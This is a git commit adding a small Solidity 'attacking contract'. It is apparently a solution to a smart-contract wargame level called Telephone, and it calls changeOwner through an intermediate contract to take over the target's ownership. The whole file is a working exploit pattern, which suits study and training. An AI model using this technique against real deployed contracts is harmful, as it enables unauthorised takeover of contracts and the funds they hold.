31b4834949f649548786bb937e40b7a6fbb2e161
Okiki-Olugunna <92333005+Okiki-Olugunna@users.noreply.github.com>
2022-05-19 19:25:49 +0100

    my attacking contract

---
+++ 4-Telephone/TelephoneAttack.sol
@@ -0,0 +1,19 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import "./Telephone.sol";
+
+contract Attack {
+
+    address player = 0xE2abE9F7C4Bc94e61c7Ce342D08262Ec8F5C9A4A;
+    Telephone public victim;
+
+    constructor(address _victimaddress) public {
+        victim = Telephone(_victimaddress);
+    }
+
+    function becomeTheOwner() public {
+        victim.changeOwner(player);
+    }
+
+}
